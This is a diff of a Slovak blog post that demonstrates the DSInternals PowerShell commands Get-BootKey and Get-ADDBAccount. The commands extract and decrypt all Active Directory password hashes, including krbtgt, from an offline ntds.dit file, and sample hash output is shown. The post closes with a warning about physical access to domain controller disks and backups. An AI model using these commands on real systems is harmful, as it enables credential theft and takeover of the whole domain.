@@ -10,7 +10,8 @@ permalink: /sk/vykradanie-hesiel-zo-zalohy-active-directory/
   Nedávno som písal o&nbsp;príkaze <a href="https://www.dsinternals.com/sk/vykradanie-hesiel-z-active-directory-na-dialku/">Get-ADReplAccount</a>, pomocou ktorého je&nbsp;možné vzdialene vytiahnuť heslá a&nbsp;iné citlivé informácie z doménového kontroléru. Tieto dáta sú na&nbsp;každom doménovom kontroléri uložené v&nbsp;súbore <strong>ndts.dit</strong> a&nbsp;odtiaľ sa&nbsp;dajú získať aj&nbsp;napriamo. Dokáže to&nbsp;napríklad nástroj <a href="http://www.ntdsxtract.com/">NTDSXtact</a>, ale&nbsp;ten je&nbsp;určený pre&nbsp;Linux, nemá moc jednoduché ovládanie a&nbsp;na&nbsp;väčších databázach je&nbsp;dosť pomalý. Preto som do svojho <a href="https://www.dsinternals.com/sk/na-stiahnutie/">PowerShell modulu DSInternals</a> pridal príkaz <strong>Get-ADDBAccount</strong>, ktorého použitie je&nbsp;hračka:
 </p>
 
-<pre class="lang:ps decode:true"># Z&nbsp;registrov najprv získame tzv. Boot Key, ktorým sú heslá zašifrované:
+{% highlight powershell %}
+# Z&nbsp;registrov najprv získame tzv. Boot Key, ktorým sú heslá zašifrované:
 $key = Get-BootKey -SystemHivePath 'C:\IFM\registry\SYSTEM'
 
 # Načítame databázu a&nbsp;dešifrujeme heslá všetkých používateľov:
@@ -18,13 +19,14 @@ Get-ADDBAccount -All -DBPath 'C:\IFM\Active Directory\ntds.dit' -BootKey $key
 
 # Môžeme vytiahnuť aj&nbsp;heslo konkrétneho účtu, na&nbsp;základe distinguishedName, objectGuid, objectSid či&nbsp;sAMAccountName:
 Get-ADDBAccount -DistinguishedName 'CN=krbtgt,CN=Users,DC=Adatum,DC=com' -DBPath 'C:\IFM\Active Directory\ntds.dit' -BootKey $key 
-</pre>
+{% endhighlight powershell %}
 
 <p style="text-align: justify;">
   Výstup vyzerá úplne rovnako ako v&nbsp;prípade príkazu <a href="https://www.dsinternals.com/sk/vykradanie-hesiel-z-active-directory-na-dialku/">Get-ADReplAccount</a>:
 </p>
 
-<pre class="nums:false lang:default highlight:0 decode:true">DistinguishedName: CN=krbtgt,CN=Users,DC=Adatum,DC=com
+{% highlight powershell %}
+DistinguishedName: CN=krbtgt,CN=Users,DC=Adatum,DC=com
 Sid: S-1-5-21-3180365339-800773672-3767752645-502
 Guid: f58947a0-094b-4ae0-9c6a-a435c7d8eddb
 SamAccountName: krbtgt
@@ -113,7 +115,8 @@ SupplementalCredentials:
     Hash 26: 021c07151ece2de494402cf11f62a036
     Hash 27: d657b31bfcacb37443630759cc3a19bf
     Hash 28: 5d49708350e04b16ddc980a0c33c409b
-    Hash 29: efe601100b7b4007fe3fa778499d5dda</pre>
+    Hash 29: efe601100b7b4007fe3fa778499d5dda
+{% endhighlight %}
 
 <p style="text-align: justify;">
   Získané hashe hesiel sa&nbsp;dajú pomerne jednoducho využiť k&nbsp;ovládnutiu celého Active Directory forestu. Preto si&nbsp;dajte dobrý pozor na&nbsp;to, kto všetko má fyzický prístup k&nbsp;pevným diskom doménových kontrolérov, ich zálohám a&nbsp;v&nbsp;neposledom rade k&nbsp;VHD/VHDX/VMDK obrazom.
